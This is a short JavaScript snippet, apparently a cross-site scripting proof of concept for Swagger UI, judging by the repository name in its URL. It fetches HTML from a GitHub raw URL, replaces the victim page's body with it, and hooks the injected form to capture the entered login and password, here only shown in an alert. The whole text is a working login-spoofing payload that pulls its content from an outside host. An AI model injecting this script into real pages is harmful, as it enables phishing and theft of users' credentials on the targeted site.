fetch("https://raw.githubusercontent.com/Tanmay95/swagger-xss/main/test.html").then(res=>res.text()).then(res => {


  document.body.innerHTML = res;

  const form = document.querySelector('#aa');

  form.addEventListener("submit", function(evt) {
    evt.preventDefault();

    let login = document.querySelector('#user').value
    let pass = document.querySelector('#pass').value
    alert('Login: ' + login + " password: " + pass);

    return;
  }, true);
})

